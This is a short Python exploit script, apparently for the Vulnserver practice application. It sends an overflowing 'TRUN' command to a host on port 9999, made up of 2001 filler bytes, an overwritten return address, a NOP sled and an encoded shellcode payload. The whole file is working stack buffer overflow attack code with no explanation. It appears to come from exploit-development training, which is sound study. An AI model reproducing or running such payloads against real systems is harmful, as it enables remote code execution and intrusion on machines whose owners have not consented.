#!/usr/bin/python3
import socket
ip = '192.168.1.83'
port = 9999
timeout = 5
prefix = b"TRUN /.../ "
offset = 2001
returnAdd = b"\xaf\x11\x50\x62"
NOP = b"\x90" * 20
buf =  b""
buf += b"\xdb\xdd\xd9\x74\x24\xf4\xbe\xd1\x09\xeb\x19\x5d\x2b"
buf += b"\xc9\xb1\x52\x83\xed\xfc\x31\x75\x13\x03\xa4\x1a\x09"
buf += b"\xec\xba\xf5\x4f\x0f\x42\x06\x30\x99\xa7\x37\x70\xfd"
buf += b"\xac\x68\x40\x75\xe0\x84\x2b\xdb\x10\x1e\x59\xf4\x17"
buf += b"\x97\xd4\x22\x16\x28\x44\x16\x39\xaa\x97\x4b\x99\x93"
buf += b"\x57\x9e\xd8\xd4\x8a\x53\x88\x8d\xc1\xc6\x3c\xb9\x9c"
buf += b"\xda\xb7\xf1\x31\x5b\x24\x41\x33\x4a\xfb\xd9\x6a\x4c"
buf += b"\xfa\x0e\x07\xc5\xe4\x53\x22\x9f\x9f\xa0\xd8\x1e\x49"
buf += b"\xf9\x21\x8c\xb4\x35\xd0\xcc\xf1\xf2\x0b\xbb\x0b\x01"
buf += b"\xb1\xbc\xc8\x7b\x6d\x48\xca\xdc\xe6\xea\x36\xdc\x2b"
buf += b"\x6c\xbd\xd2\x80\xfa\x99\xf6\x17\x2e\x92\x03\x93\xd1"
buf += b"\x74\x82\xe7\xf5\x50\xce\xbc\x94\xc1\xaa\x13\xa8\x11"
buf += b"\x15\xcb\x0c\x5a\xb8\x18\x3d\x01\xd5\xed\x0c\xb9\x25"
buf += b"\x7a\x06\xca\x17\x25\xbc\x44\x14\xae\x1a\x93\x5b\x85"
buf += b"\xdb\x0b\xa2\x26\x1c\x02\x61\x72\x4c\x3c\x40\xfb\x07"
buf += b"\xbc\x6d\x2e\x87\xec\xc1\x81\x68\x5c\xa2\x71\x01\xb6"
buf += b"\x2d\xad\x31\xb9\xe7\xc6\xd8\x40\x60\x29\xb4\x4b\x71"
buf += b"\xc1\xc7\x4b\x60\x4d\x41\xad\xe8\x7d\x07\x66\x85\xe4"
buf += b"\x02\xfc\x34\xe8\x98\x79\x76\x62\x2f\x7e\x39\x83\x5a"
buf += b"\x6c\xae\x63\x11\xce\x79\x7b\x8f\x66\xe5\xee\x54\x76"
buf += b"\x60\x13\xc3\x21\x25\xe5\x1a\xa7\xdb\x5c\xb5\xd5\x21"
buf += b"\x38\xfe\x5d\xfe\xf9\x01\x5c\x73\x45\x26\x4e\x4d\x46"
buf += b"\x62\x3a\x01\x11\x3c\x94\xe7\xcb\x8e\x4e\xbe\xa0\x58"
buf += b"\x06\x47\x8b\x5a\x50\x48\xc6\x2c\xbc\xf9\xbf\x68\xc3"
buf += b"\x36\x28\x7d\xbc\x2a\xc8\x82\x17\xef\xe8\x60\xbd\x1a"
buf += b"\x81\x3c\x54\xa7\xcc\xbe\x83\xe4\xe8\x3c\x21\x95\x0e"
buf += b"\x5c\x40\x90\x4b\xda\xb9\xe8\xc4\x8f\xbd\x5f\xe4\x85"
buffer = b"A" * 2001 + returnAdd + NOP + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)


s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()   

